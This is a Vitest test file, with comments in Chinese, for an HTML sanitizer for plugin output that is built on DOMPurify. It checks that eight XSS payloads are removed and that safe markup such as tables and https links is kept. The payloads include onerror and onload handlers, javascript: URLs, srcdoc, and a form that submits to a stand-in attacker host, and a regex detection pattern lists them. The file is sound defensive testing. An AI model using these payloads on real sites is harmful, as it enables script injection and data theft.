import { describe, expect, it } from 'vitest';
import DOMPurify from 'dompurify';
import { sanitizePluginHtml } from './sanitizePluginHtml';

/** 命中任意一项即视为消毒失败。大小写不敏感：属性名/URL scheme 都可以混写绕过。 */
const DANGEROUS = /onerror|onload|onclick|javascript:|<script|<iframe|<form|srcdoc/i;

/**
 * 8 种已确认能绕过旧实现（仅正则剥 <script>）的 payload。
 * 全部来自真实攻击面：tool 结果里的外部网页/文档内容。
 */
const XSS_PAYLOADS: { name: string; payload: string }[] = [
  { name: 'img onerror', payload: '<img src=x onerror="alert(1)">' },
  { name: 'svg onload', payload: '<svg onload="alert(1)"></svg>' },
  { name: 'iframe javascript:', payload: '<iframe src="javascript:alert(1)"></iframe>' },
  { name: 'script 标签', payload: '<script>alert(1)</script>' },
  { name: 'a javascript: href', payload: '<a href="javascript:alert(1)">点我</a>' },
  { name: 'form action', payload: '<form action="https://evil.example/steal"><input name="k"></form>' },
  { name: 'iframe srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: 'div onclick', payload: '<div onclick="alert(1)">点我</div>' },
];

describe('sanitizePluginHtml · XSS 净化', () => {
  it.each(XSS_PAYLOADS)('剥掉危险内容：$name', ({ payload }) => {
    const { html, supported } = sanitizePluginHtml(payload);
    expect(supported).toBe(true);
    expect(html).not.toMatch(DANGEROUS);
  });

  it('混合 payload 一次清洗', () => {
    const { html } = sanitizePluginHtml(XSS_PAYLOADS.map(p => p.payload).join('\n'));
    expect(html).not.toMatch(DANGEROUS);
  });

  it('大小写变体同样剥掉', () => {
    const { html } = sanitizePluginHtml('<IMG SRC=x ONERROR="alert(1)"><A HREF="JaVaScRiPt:alert(1)">x</A>');
    expect(html).not.toMatch(DANGEROUS);
  });

  it('DOM 不受支持时必须显式降级，而不是静默原样返回', () => {
    // DOMPurify 在 isSupported=false 时 sanitize() 会原样返回输入（不抛错）。
    // 复现该场景，确认模块把 supported=false 透出去、由调用方走纯文本兜底。
    const original = DOMPurify.isSupported;
    (DOMPurify as { isSupported: boolean }).isSupported = false;
    try {
      expect(sanitizePluginHtml('<img src=x onerror="alert(1)">')).toEqual({ html: '', supported: false });
    } finally {
      (DOMPurify as { isSupported: boolean }).isSupported = original;
    }
  });
});

describe('sanitizePluginHtml · 正常 HTML 必须保留', () => {
  it('保留加粗与表格结构', () => {
    const raw = '<b>加粗</b><table><thead><tr><th>列</th></tr></thead><tbody><tr><td>值</td></tr></tbody></table>';
    const { html, supported } = sanitizePluginHtml(raw);
    expect(supported).toBe(true);
    expect(html).toContain('<b>加粗</b>');
    expect(html).toContain('<table>');
    expect(html).toContain('<th>列</th>');
    expect(html).toContain('<td>值</td>');
  });

  it('保留中文文本与 https 链接', () => {
    const raw = '<p>糯米项目：<a href="https://example.com/doc" title="资料">查看资料</a>，共 3 条命中。</p>';
    const { html } = sanitizePluginHtml(raw);
    expect(html).toContain('糯米项目');
    expect(html).toContain('https://example.com/doc');
    expect(html).toContain('查看资料');
    expect(html).toContain('共 3 条命中');
  });
});
